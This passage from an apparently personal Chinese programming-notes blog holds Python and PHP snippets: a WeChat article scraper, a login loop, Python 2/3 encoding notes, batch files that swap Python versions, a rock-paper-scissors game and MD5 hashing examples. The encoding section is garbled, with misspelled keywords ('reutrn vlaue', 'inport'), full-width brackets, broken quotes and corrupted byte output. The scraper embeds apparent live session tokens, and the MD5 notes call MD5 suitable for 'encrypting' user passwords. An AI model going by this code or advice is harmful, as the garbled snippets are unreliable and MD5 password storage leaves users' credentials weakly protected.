class="line">tail_recursion(<span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line"><span class="number">5</span>+<span class="number">4</span>+<span class="number">3</span>+<span class="number">2</span>+<span class="number">1</span>=<span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="获取公众号全部文章"><a href="#获取公众号全部文章" class="headerlink" title="获取公众号全部文章"></a>获取公众号全部文章</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mp.weixin.qq.com/s/nkW2sYLcdsNTYTkk-4BeLA</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://mp.weixin.qq.com/mp/xxx'</span>（公众号不让添加主页链接，xxx表示profile_ext)</span><br><span class="line">#url='https://mp.weixin.qq.com/mp/profile_ext?action=getmsg&amp;__biz=MzIyMjg2ODExMA==&amp;f=json&amp;offset=21&amp;count=10&amp;is_ok=1&amp;scene=124&amp;uin=NjQ3OTQwMTAy&amp;key=a90c16d3bbfeedd04adeeda7bfc81049f486e81712f95a347e33fccfb9fe00841ec6a4d0984ce32f72fe5e8c479fd13c6680b5496cda322ab1bb2b81417a10ae277a861ad580e77cdf78edbf86212c08&amp;pass_ticket=2vonvdf3N4L67te2BCa4ZqvIs1ed2MoeBqoznvfNSL%2BeKqF4YgHUvNEWLNczZovz&amp;wxtoken=&amp;appmsg_token=1015_jLHC7BDStvidMqo9YO55XLerjoP9z6UM70Q5vw~~&amp;x5=0&amp;f=json'</span><br><span class="line"># Mongo配置</span><br><span class="line">conn = MongoClient(<span class="string">'127.0.0.1'</span>, <span class="number">27017</span>)</span><br><span class="line">db = conn.wx  #连接wx数据库，没有则自动创建</span><br><span class="line">mongo_wx = db.article  #使用article集合，没有则自动创建</span><br><span class="line"></span><br><span class="line">def get_wx_article(biz, uin, key, index=<span class="number">0</span>, count=<span class="number">10</span>):</span><br><span class="line">    offset = (index + <span class="number">1</span>) * count</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'__biz'</span>: biz,</span><br><span class="line">        <span class="string">'uin'</span>: uin,</span><br><span class="line">        <span class="string">'key'</span>: key,</span><br><span class="line">        <span class="string">'offset'</span>: offset,</span><br><span class="line">        <span class="string">'count'</span>: count,</span><br><span class="line">        <span class="string">'action'</span>: <span class="string">'getmsg'</span>,</span><br><span class="line">        <span class="string">'f'</span>: <span class="string">'json'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url=url, params=params, headers=headers)</span><br><span class="line">    resp_json = response.json()</span><br><span class="line">    <span class="keyword">if</span> resp_json.get(<span class="string">'errmsg'</span>) == <span class="string">'ok'</span>:</span><br><span class="line">        resp_json = response.json()</span><br><span class="line">        # 是否还有分页数据， 用于判断return的值</span><br><span class="line">        can_msg_continue = resp_json[<span class="string">'can_msg_continue'</span>]</span><br><span class="line">        # 当前分页文章数</span><br><span class="line">        msg_count = resp_json[<span class="string">'msg_count'</span>]</span><br><span class="line">        general_msg_list = json.loads(resp_json[<span class="string">'general_msg_list'</span>])</span><br><span class="line">        list = general_msg_list.get(<span class="string">'list'</span>)</span><br><span class="line">        print(list, <span class="string">"**************"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">            app_msg_ext_info = i[<span class="string">'app_msg_ext_info'</span>]</span><br><span class="line">            # 标题</span><br><span class="line">            title = app_msg_ext_info[<span class="string">'title'</span>]</span><br><span class="line">            # 文章地址</span><br><span class="line">            content_url = app_msg_ext_info[<span class="string">'content_url'</span>]</span><br><span class="line">            # 封面图</span><br><span class="line">            cover = app_msg_ext_info[<span class="string">'cover'</span>]</span><br><span class="line"></span><br><span class="line">            # 发布时间</span><br><span class="line">            datetime = i[<span class="string">'comm_msg_info'</span>][<span class="string">'datetime'</span>]</span><br><span class="line">            datetime = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(datetime))</span><br><span class="line"></span><br><span class="line">            mongo_wx.insert(&#123;</span><br><span class="line">                <span class="string">'title'</span>: title,</span><br><span class="line">                <span class="string">'content_url'</span>: content_url,</span><br><span class="line">                <span class="string">'cover'</span>: cover,</span><br><span class="line">                <span class="string">'datetime'</span>: datetime</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">if</span> can_msg_continue == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'获取文章异常...'</span>)</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    biz = <span class="string">'Mzg4MTA2Nzg0NA=='</span></span><br><span class="line">    uin = <span class="string">'NDIyMTI5NDM1'</span></span><br><span class="line">    key = <span class="string">'20a680e825f03f1e7f38f326772e54e7dc0fd02ffba17e92730ba3f0a0329c5ed310b0bd55b3c0b1f122e5896c6261df2eaea4036ab5a5d32dbdbcb0a638f5f3605cf1821decf486bb6eb4d92d36c620'</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        print(f<span class="string">'开始抓取公众号第&#123;index + 1&#125; 页文章.'</span>)</span><br><span class="line">        flag = get_wx_article(biz, uin, key, index=index)</span><br><span class="line">        # 防止和谐，暂停8秒</span><br><span class="line">        time.sleep(<span class="number">8</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> not flag:</span><br><span class="line">            print(<span class="string">'公众号文章已全部抓取完毕，退出程序.'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        print(f<span class="string">'..........准备抓取公众号第&#123;index + 1&#125; 页文章.'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="PHP-与-Python-代码对比"><a href="#PHP-与-Python-代码对比" class="headerlink" title="PHP 与 Python 代码对比"></a>PHP 与 Python 代码对比</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/30958</span></span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">3</span>:</span><br><span class="line">    #累计次数,用于循环条件</span><br><span class="line">    n = n + <span class="number">1</span></span><br><span class="line">    #定义账号和密码</span><br><span class="line">    uname = <span class="string">'tangqingsong'</span></span><br><span class="line">    pwd = <span class="string">'123123'</span></span><br><span class="line">    #接收参数</span><br><span class="line">    username = input(<span class="string">'请输入用户名:'</span>)</span><br><span class="line">    password = input(<span class="string">'请输入密码:'</span>)</span><br><span class="line"></span><br><span class="line">    #判断用户输入的账号和密码是否正确，正确将提示成功，并且退出循环体</span><br><span class="line">    <span class="keyword">if</span> uname == username and pwd == password:</span><br><span class="line">        print (<span class="string">'恭喜你，登陆成功~'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    #三次机会用完的时候,提示错误次数，并告知即将退出</span><br><span class="line">    elif n == <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">'已错误'</span>, n, <span class="string">'次，即将退出...'</span>)</span><br><span class="line">    #如果在三次以内,提示还剩下几次机会</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'抱歉，账号或密码不正确，你还有'</span>, <span class="number">3</span> - n, <span class="string">'次机会'</span>)</span><br><span class="line">        </span><br><span class="line"> $n = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span> ($n &lt; <span class="number">3</span>) &#123;</span><br><span class="line">     #累计次数,用于循环条件</span><br><span class="line">     $n = $n + <span class="number">1</span>;</span><br><span class="line">     #定义账号和密码</span><br><span class="line">     $uname = <span class="string">'tangqingsong'</span>;</span><br><span class="line">     $pwd = <span class="string">'123123'</span>;</span><br><span class="line">     #接收参数</span><br><span class="line">     fwrite(STDOUT, <span class="string">'请输入用户名：'</span>);</span><br><span class="line">     $username = trim(fgets(STDIN));</span><br><span class="line">     fwrite(STDOUT, <span class="string">'请输入密码：'</span>);</span><br><span class="line">     $password = trim(fgets(STDIN));</span><br><span class="line"> </span><br><span class="line">     #判断用户输入的账号和密码是否正确，正确将提示成功，并且退出循环体</span><br><span class="line">     <span class="keyword">if</span> ($uname == $username and $pwd == $password) &#123;</span><br><span class="line">         print_r(<span class="string">'恭喜你，登陆成功~'</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         #三次机会用完的时候,提示错误次数，并告知即将退出</span><br><span class="line">     &#125; elseif ($n == <span class="number">3</span>) &#123;</span><br><span class="line">         print_r(<span class="string">"已错误&#123;$n&#125;次，即将退出..."</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         #如果在三次以内,提示还剩下几次机会</span><br><span class="line">         $j = <span class="number">3</span> - $n;</span><br><span class="line">         print_r(<span class="string">"抱歉，账号或密码不正确，你还有&#123;$j&#125;次机会"</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="python2与3的编码"><a href="#python2与3的编码" class="headerlink" title="python2与3的编码"></a>python2与3的编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">Python2有两种表示字符序列的类型，分别叫做str和Unicode，str实例包含原始的<span class="number">8</span>位值；而Unicode的实例，则包含Unicode字符。</span><br><span class="line"></span><br><span class="line">str格式本质含义是“某种编码格式”，绝大多数情况下，被引号框起来的字符串，就是str，这时的字符串编码类型，其实就是你Python文件的编码类型，比如在Windows里，默认用的是GBK编码。</span><br><span class="line">Unicode格式的含义就是“用unicode编码的字符串”。Python在进入<span class="number">2.0</span>版后正式定义了了Unicode字符串这个奇怪的特性，目的就是为了处理太多种语言编码的文本。从那时开始，Python语言中的字符串类型就分为两种：一种是传统的Python字符串（各种花样编码），另一种则是新出现的Unicode</span><br><span class="line">Python3也有两种表示字符序列的类型：bytes和str。前者的实例包含原始的<span class="number">8</span>位值，后者的实例包含Unicode字符,可以说python3的str，就是python2的Unicode</span><br><span class="line"></span><br><span class="line">str格式的定义变更为”Unicode类型的字符串“，也就是说在默认情况下，被引号框起来的字符串，是使用Unicode编码的。</span><br><span class="line">而“不是Unicode的某种编码格式”，比如UTF<span class="number">-8</span>、GBK，这些编码方式被定义为了bytes，这里的bytes和py2中的str有很多相似的地方</span><br><span class="line">我们需要编写两个辅助（helper）函数，以便在这两种情况之间转换，使得转换后的输入数据能够符合开发者的预期</span><br><span class="line"></span><br><span class="line">#在Python3中，我们需要编写接受str或bytes，并总是返回str的方法：</span><br><span class="line">def to_str(bytes_or_str):</span><br><span class="line">  <span class="keyword">if</span> isinstance(bytes_or_str, bytes):</span><br><span class="line">    value = bytes_or_str.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    value = bytes_or_str</span><br><span class="line">  return value # Instance of str</span><br><span class="line">  </span><br><span class="line">#另外，还需要编写接受str或bytes，并总是返回bytes的方法：</span><br><span class="line">def to_bytes(bytes_or_str):</span><br><span class="line">  <span class="keyword">if</span> isinstance(bytes_or_str, str):</span><br><span class="line">    value = bytes_or_str.encode(<span class="string">'utf-8)</span></span><br><span class="line"><span class="string">  else:</span></span><br><span class="line"><span class="string">    value = bytes_or_str</span></span><br><span class="line"><span class="string">  return value # Instance of bytes</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">#在Python2中，需要编写接受str或unicode，并总是返回unicode的方法：</span></span><br><span class="line"><span class="string">#python2</span></span><br><span class="line"><span class="string">def to_unicode(unicode_or_str):</span></span><br><span class="line"><span class="string">  if isinstance(unicode_or_str, str):</span></span><br><span class="line"><span class="string">    value = unicode_or_str.decode('</span>utf<span class="number">-8</span><span class="string">')</span></span><br><span class="line"><span class="string">  else:</span></span><br><span class="line"><span class="string">    value = unicode_or_str</span></span><br><span class="line"><span class="string">  return value # Instance of unicode</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">#另外，还需要编写接受str或unicode，并总是返回str的方法：</span></span><br><span class="line"><span class="string">#Python2</span></span><br><span class="line"><span class="string">def to_str(unicode_or_str):</span></span><br><span class="line"><span class="string">  if isinstance(unicode_or_str, unicode):</span></span><br><span class="line"><span class="string">    value = unicode_or_str.encode('</span>utf<span class="number">-8</span><span class="string">')</span></span><br><span class="line"><span class="string">  else:</span></span><br><span class="line"><span class="string">    value = unicode_or_str</span></span><br><span class="line"><span class="string">  reutrn vlaue # Instance of str</span></span><br><span class="line"><span class="string">  https://xin053.github.io/2016/10/30/Python%E5%AD%A6%E4%B9%A0%E9%87%8D%E7%82%B9%E6%91%98%E8%AE%B0/</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">   str包含一个encode方法，使用特定编码将该字符串其转换为一个bytes，这称之为编码</span></span><br><span class="line"><span class="string">  。bytes类包含了一个decode方法，也接受一个编码作为单个必要参数，并返回一个str，</span></span><br><span class="line"><span class="string">  这称之为解码。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">  s='</span>n排球①’</span><br><span class="line">  b1=s.encode（<span class="string">'utf-8'</span>）</span><br><span class="line">  b2=s.encode（）</span><br><span class="line">  print（b1）</span><br><span class="line">  print（b2）</span><br><span class="line">  b\xcf\x80\xe6\x8e\x92\xe7\x9e\x83\xe3\×<span class="number">8</span>l\xae<span class="string">'</span></span><br><span class="line"><span class="string">  b'</span>\xcf\×<span class="number">80</span>\xe6\x8e\x92\xe7\x9e\x83\xe3\x8l\xae<span class="string">'</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  inport sys </span></span><br><span class="line"><span class="string">  print（sys.platform）</span></span><br><span class="line"><span class="string">  print（sys.getdefaultencoding（））</span></span><br><span class="line"><span class="string">  win32utf-8</span></span><br><span class="line"><span class="string">  可以看出我这个平台默认选择的就是utf-8编码方式。</span></span><br><span class="line"><span class="string">  b=b'</span>\xe6lx8e\x92\xe7\x9e\x83<span class="string">'</span></span><br><span class="line"><span class="string">  s1=b.decode（encoding='</span>utf<span class="number">-8</span><span class="string">"）</span></span><br><span class="line"><span class="string">  s2=b.decode（）</span></span><br><span class="line"><span class="string">  s3=b.decode（encoding='latin-1'）</span></span><br><span class="line"><span class="string">  print（s1）</span></span><br><span class="line"><span class="string">  print（s2）</span></span><br><span class="line"><span class="string">  print（s3）</span></span><br><span class="line"><span class="string">  排球</span></span><br><span class="line"><span class="string">  排球</span></span><br><span class="line"><span class="string">  e2'cf</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  &gt;&gt;&gt; '请'.encode('unicode-escape')</span></span><br><span class="line"><span class="string">  b'\\u8bf7'</span></span><br><span class="line"><span class="string">  &gt;&gt;&gt; b'\u8bf7'.decode('unicode-escape')</span></span><br><span class="line"><span class="string">  '请'</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  s='apple'</span></span><br><span class="line"><span class="string">  b=b'apple'</span></span><br><span class="line"><span class="string">  print（b）</span></span><br><span class="line"><span class="string">  print（type（b））</span></span><br><span class="line"><span class="string">  print（s）</span></span><br><span class="line"><span class="string">  print（type（s））</span></span><br><span class="line"><span class="string">  b'apple'</span></span><br><span class="line"><span class="string">  &lt;class'bytes'&gt;</span></span><br><span class="line"><span class="string">  apple</span></span><br><span class="line"><span class="string">  &lt;class'str'&gt;</span></span><br><span class="line"><span class="string">  再近距离的看看bytes类型字节字符串，本质上它就是一串单字节16进制数b=b'apple' https://www.zhihu.com/question/35584979</span></span><br><span class="line"><span class="string">  print（b[0]）</span></span><br><span class="line"><span class="string">  print（b[1：]）</span></span><br><span class="line"><span class="string">  print（1ist（b））</span></span><br><span class="line"><span class="string">  97</span></span><br><span class="line"><span class="string">  b'pple'</span></span><br><span class="line"><span class="string">  [97，112，112，188，101]</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  s=' AABec'</span></span><br><span class="line"><span class="string">  with open(' utf-8data','w', encoding=' utf-8"</span>) <span class="keyword">as</span> f: <span class="string">' +</span></span><br><span class="line"><span class="string">   '</span>f. urite(s)</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">' utf-8data'</span>,<span class="string">'r'</span>, encoding=<span class="string">' utf-8'</span>) <span class="keyword">as</span> f: </span><br><span class="line">  u_str=f. read()</span><br><span class="line">  print(u_str)</span><br><span class="line">  AABeC</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">' utf-8data",'</span> rb<span class="string">') as f: byte_str=f. read()</span></span><br><span class="line"><span class="string">  print(byte_str)</span></span><br><span class="line"><span class="string">  print(byte_str. decode(encoding='</span> utf<span class="number">-8</span>))</span><br><span class="line">  b<span class="string">'A\ XC3\X84B\ xC3\ xa8c'</span></span><br><span class="line">  AABeC</span><br></pre></td></tr></table></figure>
<h3 id="Win10-下-Python2-与-Python3-兼容问题"><a href="#Win10-下-Python2-与-Python3-兼容问题" class="headerlink" title="Win10 下 Python2 与 Python3 兼容问题"></a>Win10 下 Python2 与 Python3 兼容问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">新旧<span class="number">2</span>个文件，加入环境变量</span><br><span class="line">python2.bat</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rename <span class="string">"C:\Program Files\Python37\python.exe"</span> python.exe.disabled</span><br><span class="line">rename <span class="string">"C:\Program Files\Python37\Scripts\pip.exe"</span> pip.exe.disabled</span><br><span class="line">python3.bat</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rename <span class="string">"C:\Program Files\Python37\python.exe.disabled"</span> python.exe</span><br><span class="line">rename <span class="string">"C:\Program Files\Python37\Scripts\pip.exe.disabled"</span> pip.exe</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/31141</span></span><br></pre></td></tr></table></figure>
<h3 id="剪刀、石头、布"><a href="#剪刀、石头、布" class="headerlink" title="剪刀、石头、布"></a>剪刀、石头、布</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#剪刀、石头、布</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">guess_list = [<span class="string">"石头"</span>, <span class="string">"剪刀"</span>, <span class="string">"布"</span>]</span><br><span class="line">win_combination = [[<span class="string">"布"</span>, <span class="string">"石头"</span>], [<span class="string">"石头"</span>, <span class="string">"剪刀"</span>], [<span class="string">"剪刀"</span>, <span class="string">"布"</span>]]</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    people = input(<span class="string">'请输入：石头,剪刀,布\n'</span>).strip()</span><br><span class="line">    computer = random.choice(guess_list)</span><br><span class="line">    print(<span class="string">'电脑出拳：'</span>+computer)</span><br><span class="line">    <span class="keyword">if</span> people not <span class="keyword">in</span> guess_list:</span><br><span class="line">        print(<span class="string">'咦~~弄啥类你！~~~'</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> computer == people:</span><br><span class="line">        print (<span class="string">'平手，再玩一次！'</span>)</span><br><span class="line">    elif [computer, people] <span class="keyword">in</span> win_combination:</span><br><span class="line">        print (<span class="string">'电脑获胜！继续吧~~~'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print (<span class="string">'你获胜！'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'---------------------------------'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Press any key to exit'</span>);</span><br><span class="line">input();                                        #防止控制台输出秒退</span><br></pre></td></tr></table></figure>
<h3 id="md5和sha1加密"><a href="#md5和sha1加密" class="headerlink" title="md5和sha1加密"></a>md5和sha1加密</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line">data =  <span class="string">'This a md5 test!'</span></span><br><span class="line">hash_md5 = hashlib.md5(data)</span><br><span class="line"></span><br><span class="line">hash_md5.hexdigest()</span><br><span class="line">MD5不仅仅是上面这个例子这样用来处理字符串，还有更广泛的用途：</span><br><span class="line">加密网站注册用户的密码。 （但去年的各大网站密码泄漏事件确实让人蛋疼……）</span><br><span class="line">网站用户上传图片 / 文件后，计算出MD5值作为文件名。（MD5可以保证唯一性）</span><br><span class="line">key-value数据库中使用MD5值作为key。</span><br><span class="line">比较两个文件是否相同。（大家在下载一些资源的时候，就会发现网站提供了MD5值，就是用来检测文件是否被篡改）</span><br><span class="line">用MD5来检测两个文件是否相同，但想想，如果是两个很大的文件，担心内存不够用，这时怎么办？</span><br><span class="line">这就要使用 update 方法了。代码如下：</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">def get_file_md5(f):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        data = f.read(<span class="number">10240</span>)</span><br><span class="line">        <span class="keyword">if</span> not data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        m.update(data)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(YOUR_FILE, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_md5 = get_file_md5(f)</span><br><span class="line">(windows 用户 要使用 <span class="string">'rb'</span>方式打开文件)</span><br><span class="line">大家可以用下面这段代码验证一下：</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">x = hashlib.md5()</span><br><span class="line">x.update(<span class="string">'hello, '</span>)</span><br><span class="line">x.update(<span class="string">'python'</span>)</span><br><span class="line">x.hexdigest()</span><br><span class="line"></span><br><span class="line">hashlib.md5(<span class="string">'hello, python'</span>).hexdigest()</span><br><span class="line">这两次的输出是一样的。</span><br><span 